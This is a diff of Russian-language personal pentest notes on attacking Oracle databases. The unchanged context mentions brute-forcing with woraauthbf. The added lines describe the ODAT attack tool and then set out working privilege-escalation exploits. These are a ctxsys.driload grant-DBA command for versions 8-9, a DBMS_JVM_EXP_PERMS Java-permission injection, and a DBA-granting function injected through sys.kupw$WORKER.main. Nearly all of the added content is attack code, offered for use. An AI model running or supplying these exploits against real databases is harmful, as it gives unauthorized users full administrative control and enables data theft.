@@ -103,6 +103,33 @@ brute)
                         DATA.
                         3. Брутить его вот этой штукой (woraauthbf)
                         
-               ODAT, тулза для атаки на Оракула, может исполнять код и всё такое
-               
+               ODAT, тулза для атаки на Оракула, может исполнять код и всё такое, своего рода скульмап для оракла
+               Privilege Escalate      
+                         Для 8-9 это комана (exec ctxsys.driload.validate_stmt ('grant dba to scott');)
+                         Для 10-11 (     SQL> DECLARE
+                                         POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;
+                                         CURSOR C1 IS SELECT
+                                         'GRANT','GREMLIN','SYS','java.
+                                         io.FilePermission
+                                         ','<FILES>>','execute','ENABLED' FROM DUAL;
+                                         BEGIN
+                                         OPEN C1;
+                                         FETCH C1 BULK COLLECT INTO POL;
+                                         CLOSE C1;
+                                         DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);
+                                         END;
+                                         /
+                                        PL/SQL procedure successfully completed                 )
+                          Вот еще (     CREATE OR REPLACE FUNCTION F1
+                                        RETURN NUMBER AUTHID CURRENT_USER
+                                        IS
+                                        PRAGMA AUTONOMOUS_TRANSACTION;
+                                        BEGIN
+                                        EXECUTE IMMEDIATE 'GRANT DBA TO TEST';
+                                        COMMIT;RETURN(1);END;
+                                        /
+                                        Теперь можем внедрить процедуру в качестве аргумента
+                                        уязвимой функции (пример для десятых версий):
+                                        exec sys.kupw$WORKER.main
+                                        ('x','YY'' and 1=test.f1 –-');          )              
                         
